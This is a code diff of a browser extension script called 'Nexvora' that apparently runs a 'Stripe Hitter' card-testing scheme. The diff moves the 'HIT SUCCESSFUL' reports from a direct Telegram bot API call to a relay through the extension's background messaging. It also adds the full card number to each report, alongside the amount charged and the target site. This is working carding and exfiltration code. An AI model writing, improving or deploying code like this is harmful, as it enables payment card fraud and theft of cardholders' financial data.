@@ -14,21 +14,15 @@
         hasSentDirectly = true;
         
         try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [[{ text: "🚀 Open Bot", url: "https://t.me/hitinfobdrobot" }]]
-                    }
-                })
+            chrome.runtime.sendMessage({
+                type: 'NOTIFY_HIT',
+                data: {
+                    text: message
+                }
             });
-            console.log("[Nexvora] Direct transmission successful.");
+            console.log("[Nexvora] Proxy transmission successful.");
         } catch (e) {
-            console.error("[Nexvora] Direct transmission failed.", e);
+            console.error("[Nexvora] Proxy transmission failed.", e);
         }
     };
 
@@ -73,13 +67,14 @@
                 console.error("Extraction error:", e);
             }
 
-            const message = `<b>HIT BDT (DIRECT)</b>\n` +
+            const message = `<b>HIT BDT (PROXY)</b>\n` +
                             `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
                             `👤 <b>User:</b> 🇧🇩\n` +
                             `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
-                            `↔️ <b>Gateway:</b> <code>Stripe Direct Hitter</code>\n` +
+                            `↔️ <b>Gateway:</b> <code>Stripe Protected Hitter</code>\n` +
                             `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                             `🌐 <b>Site:</b> <code>${window.location.hostname || 'Unknown'}</code>\n` +
+                            `💳 <b>Card:</b> <code>${cardStr}</code>\n` +
                             `💰 <b>Amount:</b> <code>${amountStr}</code>\n\n` +
                             `<i>Checked by @hitinfobdrobot ✅</i>`;
 
